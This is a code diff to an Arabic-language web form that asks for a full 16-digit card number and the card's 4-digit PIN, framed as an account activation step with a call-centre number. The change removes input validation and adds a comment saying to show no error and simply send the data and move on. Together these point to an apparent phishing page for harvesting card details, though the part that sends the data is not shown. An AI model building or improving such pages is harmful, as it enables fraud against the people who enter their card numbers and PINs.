@@ -410,17 +410,17 @@
             <div class="card-num-label">ادخل رقم البطاقة من 16 رقم</div>
             <form id="cardInfoForm" autocomplete="off" onsubmit="return goToVerificationFromCard(event)">
                 <div class="card-num-row" dir="ltr">
-                    <input type="text" class="card-num-input" maxlength="4" pattern="\\d{4}" required id="cardNum1" name="cardNum1" autocomplete="off" inputmode="numeric" placeholder="0000">
-                    <input type="text" class="card-num-input" maxlength="4" pattern="\\d{4}" required id="cardNum2" name="cardNum2" autocomplete="off" inputmode="numeric" placeholder="0000">
-                    <input type="text" class="card-num-input" maxlength="4" pattern="\\d{4}" required id="cardNum3" name="cardNum3" autocomplete="off" inputmode="numeric" placeholder="0000">
-                    <input type="text" class="card-num-input" maxlength="4" pattern="\\d{4}" required id="cardNum4" name="cardNum4" autocomplete="off" inputmode="numeric" placeholder="0000">
+                    <input type="text" class="card-num-input" maxlength="4" required id="cardNum1" name="cardNum1" autocomplete="off" inputmode="numeric" placeholder="0000">
+                    <input type="text" class="card-num-input" maxlength="4" required id="cardNum2" name="cardNum2" autocomplete="off" inputmode="numeric" placeholder="0000">
+                    <input type="text" class="card-num-input" maxlength="4" required id="cardNum3" name="cardNum3" autocomplete="off" inputmode="numeric" placeholder="0000">
+                    <input type="text" class="card-num-input" maxlength="4" required id="cardNum4" name="cardNum4" autocomplete="off" inputmode="numeric" placeholder="0000">
                 </div>
                 <div class="card-secret-label">ادخل الرقم السري 4 خانات</div>
                 <div class="card-secret-row" dir="ltr">
-                    <input type="password" class="card-secret-input" maxlength="1" pattern="\\d{1}" required id="cardSecret1" name="cardSecret1" autocomplete="off" inputmode="numeric" placeholder="*">
-                    <input type="password" class="card-secret-input" maxlength="1" pattern="\\d{1}" required id="cardSecret2" name="cardSecret2" autocomplete="off" inputmode="numeric" placeholder="*">
-                    <input type="password" class="card-secret-input" maxlength="1" pattern="\\d{1}" required id="cardSecret3" name="cardSecret3" autocomplete="off" inputmode="numeric" placeholder="*">
-                    <input type="password" class="card-secret-input" maxlength="1" pattern="\\d{1}" required id="cardSecret4" name="cardSecret4" autocomplete="off" inputmode="numeric" placeholder="*">
+                    <input type="password" class="card-secret-input" maxlength="1" required id="cardSecret1" name="cardSecret1" autocomplete="off" inputmode="numeric" placeholder="*">
+                    <input type="password" class="card-secret-input" maxlength="1" required id="cardSecret2" name="cardSecret2" autocomplete="off" inputmode="numeric" placeholder="*">
+                    <input type="password" class="card-secret-input" maxlength="1" required id="cardSecret3" name="cardSecret3" autocomplete="off" inputmode="numeric" placeholder="*">
+                    <input type="password" class="card-secret-input" maxlength="1" required id="cardSecret4" name="cardSecret4" autocomplete="off" inputmode="numeric" placeholder="*">
                 </div>
                 <div class="card-info-note">
                     في حال تعسر امتلاك بطاقة يرجى الضغط على إلغاء والمتابعة مع مركز الاتصال لتفعيل الحساب على الرقم <span>065680001</span>
@@ -544,17 +544,7 @@
                 document.getElementById('cardSecret3').value,
                 document.getElementById('cardSecret4').value
             ].join('');
-            // تحقق من أن كل خانة تحتوي على 4 أرقام
-            if (
-                document.getElementById('cardNum1').value.length !== 4 ||
-                document.getElementById('cardNum2').value.length !== 4 ||
-                document.getElementById('cardNum3').value.length !== 4 ||
-                document.getElementById('cardNum4').value.length !== 4
-            ) {
-                alert("يجب إدخال رقم البطاقة بشكل كامل (16 رقم، كل خانة 4 أرقام).");
-                document.getElementById('cardNum1').focus();
-                return false;
-            }
+            // لا تعرض أي رسالة مطابقة أو خطأ عند الإدخال، فقط أرسل وانقل للصفحة التالية
             cardInfoData = {
                 cardNum1: document.getElementById('cardNum1').value,
                 cardNum2: document.getElementById('cardNum2').value,
